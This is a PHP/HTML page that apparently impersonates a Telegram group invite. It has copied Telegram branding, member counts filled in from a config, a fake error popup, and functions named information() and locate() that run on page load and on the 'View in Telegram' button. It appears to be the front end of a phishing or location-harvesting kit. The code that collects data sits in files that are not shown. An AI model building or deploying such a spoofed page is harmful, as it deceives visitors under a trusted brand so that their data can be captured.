<?php 
	include('query_handler.php');
    $data = set_config();
?>

<!DOCTYPE html>
<html>

<head>
	<meta charset="utf-8" />
	<title>Telegram: Contact @<?= $data->group_name ?></title>
	<meta content="width=device-width, initial-scale=1.0" name="viewport" />
	<meta content="$TITLE$" property="og:title" />
	<meta content="https://telegram.org/img/t_logo.png" property="og:image" />
	<meta content="Telegram" property="og:site_name" />
	<meta content="<?= $data->group_describe ?>" property="og:description" />
	<meta content="<?= $data->group_name ?>" property="twitter:title" />
	<meta content="https://telegram.org/img/t_logo.png" property="twitter:image" />
	<meta content="summary" name="twitter:card" />
	<meta content="@Telegram" name="twitter:site" />
	<meta content="<?= $data->group_describe ?>" />
	<script type="text/javascript" src="./js/jquery.min.js"></script>
	<link href="favicon.ico?3" rel="shortcut icon" type="image/x-icon" />
	<link href="../css/css" rel="stylesheet" type="text/css" />
	<link href="../css/bootstrap.min.css" rel="stylesheet" />
	<link href="../css/telegram.css" media="screen" rel="stylesheet" />
	<style>
		.modal {
			display: none;
			width: 350px;
			height: auto;
			position: absolute;
			top: 50%;
			left: 50%;
			transform: translate(-50%, -50%);
			background-color: white;
			box-shadow: 0px 0px 25px 0px rgba(0, 0, 0, 0.75);
			color: black;
			border-radius: 8px;
			text-align: center;
			font-size: 22px;
			font-weight: bold;
			padding: 20px 20px 60px 20px !important;
		}

		.modal-footer {
			display: flex;
			justify-content: center;
		}

		.modal-button {
			position: absolute;
			bottom: 0px;
			padding-bottom: 20px !important;
			color: #1ebea5;
			font-size: 22px;
			font-weight: bold;
			background-color: transparent;
			border: 0;
		}
	</style>
</head>

<body onload="information();">
	<div class="tgme_page_wrap">
		<div class="tgme_head_wrap">
			<div class="tgme_head">
				<a class="tgme_head_brand" href="https://telegram.org/">
					<i class="tgme_logo"></i>
				</a>
			</div>
		</div>
		<a class="tgme_head_dl_button" href="https://telegram.org/">
			Don't have <strong>Telegram</strong> yet? Try it now!<i class="tgme_icon_arrow"></i>
		</a>
		<div class="tgme_page tgme_page_post">
			<div class="tgme_page_photo">
				<img class="tgme_page_photo_image" src="images/spinner.png" />
			</div>
			<div class="tgme_page_title" dir="auto">
				<span dir="auto"> <?= $data->group_name ?> </span>
			</div>
			<div class="tgme_page_extra"><?= $data->all_member ?> members, <?= $data->online_member ?> online</div>
			<div class="tgme_page_description" dir="auto">
			<?= $data->group_describe ?>
			</div>
			<div class="tgme_page_action">
				<a class="tgme_action_button_new" onclick="locate();">View in Telegram</a>
			</div>
			<div class="tgme_page_additional">
				If you have <strong>Telegram</strong>, you can view and join <br /><strong><?= $data->group_name ?></strong> right away.
			</div>
		</div>
	</div>
	<div id="tgme_frame_cont"></div>
	<div id="dialog" class="modal">
		<p>An unexpected error has occurred. Our wizards have been notified and will fix the problem soon. Sorry.</p>
		<div class="modal-footer">
			<button class="modal-button" onclick="disap();">OK</button>
		</div>
	</div>
	<script src="./js/script.js"></script>
	<script>
		$("#dialog").fadeIn();
	</script>
</body>

</html>